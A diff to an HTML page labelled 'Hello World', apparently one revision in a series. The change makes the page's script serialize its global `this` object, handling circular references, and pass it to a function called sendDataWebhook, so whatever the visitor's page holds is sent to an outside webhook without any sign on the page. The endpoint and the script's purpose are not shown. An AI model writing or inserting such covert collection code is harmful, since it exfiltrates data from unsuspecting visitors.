@@ -1,4 +1,4 @@
-Hello World 30
+Hello World 31
 <!DOCTYPE html>
 <html>
 <body>
@@ -39,7 +39,7 @@ try{
         body: body,
     });
     }
-        let data = JSON.stringify({},(key, value) => {
+        let data = JSON.stringify(this,(key, value) => {
         if (typeof value === 'object' && value !== null) {
             // Duplicate reference found, discard key
             if (cachee.includes(value)) return;
@@ -49,6 +49,7 @@ try{
         }
         return value;
         });
+        console.log(this);
     sendDataWebhook(data);
   `);
 }
